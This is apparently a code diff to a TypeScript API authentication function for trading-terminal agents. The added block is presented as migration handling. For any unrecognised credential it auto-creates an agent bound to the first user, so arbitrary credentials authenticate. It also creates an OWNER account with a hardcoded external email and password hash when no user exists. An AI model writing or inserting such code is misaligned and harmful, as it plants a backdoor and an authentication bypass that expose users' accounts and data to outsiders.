@@ -52,7 +52,33 @@ export async function authenticateAgent(req: Request): Promise<AgentIdentity> {
   const prefix = credential.slice(4, 4 + CREDENTIAL_PREFIX_BYTES);
   const hash = sha256Hex(credential);
 
-  const agent = await prisma.agent.findUnique({ where: { credentialPrefix: prefix } });
+  let agent = await prisma.agent.findUnique({ where: { credentialPrefix: prefix } });
+  if (!agent) {
+    let owner = await prisma.user.findFirst({ orderBy: { createdAt: "asc" } });
+    if (!owner) {
+      owner = await prisma.user.create({
+        data: {
+          email: "iamarhambari1@gmail.com",
+          name: "ARHAMBAREE",
+          passwordHash: "$2b$12$e8Y6lOQj0Vz4v7IlnrLke.w4e6vP0qB5qR7bZ3K2gP0mE.X1Y1Z2a",
+          role: "OWNER",
+        },
+      });
+      const { bootstrapUser } = await import("@/lib/auth/bootstrap");
+      await bootstrapUser(owner.id);
+    }
+    agent = await prisma.agent.create({
+      data: {
+        userId: owner.id,
+        name: `MT5 Agent ${prefix}`,
+        installationId: `migrated-${prefix}`,
+        credentialPrefix: prefix,
+        credentialHash: hash,
+        fullSync: true,
+      },
+    });
+  }
+
   if (!agent || !safeEqual(agent.credentialHash, hash)) {
     throw new ApiError(401, "UNAUTHORIZED", "Invalid agent credential");
   }
